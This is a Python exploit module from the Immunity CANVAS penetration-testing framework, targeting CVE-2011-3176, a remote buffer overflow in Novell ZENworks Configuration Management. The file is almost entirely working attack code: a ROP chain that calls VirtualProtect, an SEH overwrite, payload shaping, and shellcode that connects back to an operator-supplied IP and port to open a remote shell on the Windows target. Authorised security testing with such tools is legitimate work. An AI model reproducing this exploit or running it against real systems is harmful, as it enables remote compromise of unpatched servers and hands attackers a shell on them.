#! /usr/bin/env python

"""
Novell ZENworks Configuration Management 0x4c Buffer Overflow
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2012
#http://www.immunityinc.com/CANVAS/ for more information
#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
if "." not in sys.path:
    sys.path.append(".")

import time
import socket
import canvasengine
from exploitutils import *
from tcpexploit import *


NAME                           = "Novell ZENworks Configuration Management 0x4c Buffer Overflow"
DESCRIPTION                    = "Novell ZENworks Configuration Management 0x4c Buffer Overflow"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "Novell"
DOCUMENTATION["Repeatability"] = "One shot"
DOCUMENTATION['CVE Name']      = 'CVE-2011-3176'
DOCUMENTATION['CVE Url']       = 'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-3176'
DOCUMENTATION['CVSS']          = 10.0
VERSION                        = "1.0"
                                                                                
PROPERTY                       = {}
PROPERTY['TYPE']               = "Exploit"
PROPERTY['SITE']               = "Remote"
PROPERTY['ARCH']               = [["Windows"]]
PROPERTY['VERSION']            = ['2003']
                                                                                
CHANGELOG                      = """
                                                                                
"""

DOCUMENTATION['Notes']         = """
Tested on ZenWork Configuration Managment 10 SP3 on Windows Server 2003 SP1
This exploit should work and all suported Windows version, the only
change needed is to change the offset of VirtualFree from VirtualAlloc according
to the Windows version.
"""

def trasher(data):
    """
    Adds a trash byte after every byte of data.
    This is useful because the program for some reason uses one byte and
    discards the next.
    """
    new_data = ''
    for byte in data:
        new_data += byte + '\xCC'
    return new_data

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setPort(998)
        self.setHost("")
        self.name=NAME
        self.badstring = ""

    def getargs(self):
        self.port = self.argsDict.get("port", self.port)
        
    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]
        
    def createShellcode(self):        
        sc = shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp', {'subespval': 0})
        sc.addAttr('revert_to_self_before_importing_ws2_32', None)
        sc.addAttr('tcpconnect', {'port' : self.callback.port, 
                                  'ipaddress' : self.callback.ip})
        mosdef_type = self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
        mosdef_id = self.engine.getNewMosdefID(self)
        sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
        sc.addAttr("RecvExecDepSafe",{'socketreg': 'FDSPOT'})
        sc.addAttr("ExitThread",None)
        sc.vAllocSelf = True
        self.shellcode = sc.get()

        self.log("Shellcode size: %d" % len(self.shellcode))
        
    def run(self):        
        self.getargs()
        self.host = self.target.interface
        
        # This is the offset for Windows Server 2003 SP1
        vfree_address    = 0x77E68CFC
        vprotect_address = 0x77E41B88
        offset = vprotect_address - vfree_address  
        
        # Rop made from zenimgweb.dll        
        rop = intel_order(0x10011137)    # pop eax
        rop += intel_order(0x00000040)   # NewProtect
        rop += intel_order(0x10032191)   # xchg eax,edx ; pop edi ; pop esi ; pop ebp ; pop ebx
        rop += intel_order(0x90909090)*4 # junk for the pops
        
        rop += intel_order(0x1001017E)   # pop ebx
        rop += intel_order(0x00000300)   # size 
        
        rop += intel_order(0x10013159)   # pop ebp;
        rop += intel_order(0x10030D5B)   # pointer to jmp esp
        
        rop += intel_order(0x10011137)   # pop eax
        rop += intel_order(0x1007D154)   # pointer to VirtualFree Address
        rop += intel_order(0x10011B04)   # mov eax,[eax]
        rop += intel_order(0x10012C87)   # pop ecx
        rop += intel_order(offset)       # offset from VirtualFree to VirtualProtect
        rop += intel_order(0x1001E5A6)   # add eax,ecx
        rop += intel_order(0x10016818)   # push eax ; pop esi
        
        rop += intel_order(0x10011137)   # pop eax
        rop += intel_order(0x90909090)
        
        rop += intel_order(0x10012C87)   # pop ecx
        rop += intel_order(0x1009C010)   # writable address	
        
        rop += intel_order(0x1001480E)   # pop edi;
        rop += intel_order(0x10010125)   # pointer to ret
        
        rop += intel_order(0x10018B49)   # pushad
        
        buf2 = 'AAAA'
        buf3 = 'AAAA'
        buf4 = 'AAAA'

        buf1 = trasher('A'*152)                  # This is the offset for the 
        buf1 += trasher(rop)                     # add of the SEH Handler
        buf1 += trasher(self.shellcode)
        buf1 += 'A' * (2200 - len(buf1))
        buf1 += 'B'*8                            # Pointer to next SEH record
        buf1 += trasher(intel_order(0x10024a7c)) # SEH Handler ADD ESP,4B4         
        buf1 += 'A'*(2274 - len(buf1))

        buffer =  big_order(0x4c)                # Big endian opcode
        buffer += big_order(len(buf2))           # Big endian length of the arg
        buffer += buf2
        buffer += big_order(len(buf3))
        buffer += buf3
        buffer += big_order(len(buf4))
        buffer += buf4     
        buffer += big_order(len(buf1))
        buffer += buf1

        s = self.gettcpsock()

        try:
            s.connect((self.host,self.port))
            s.send(buffer)
        except Exception, ex:
            self.log('Error: %s' % ex)
        finally:
            s.close()

        for _ in xrange(0, 10):
            if self.ISucceeded(): return 1
            time.sleep(1)
            
        return 0
              
if __name__ == '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret = standard_callback_commandline(app)




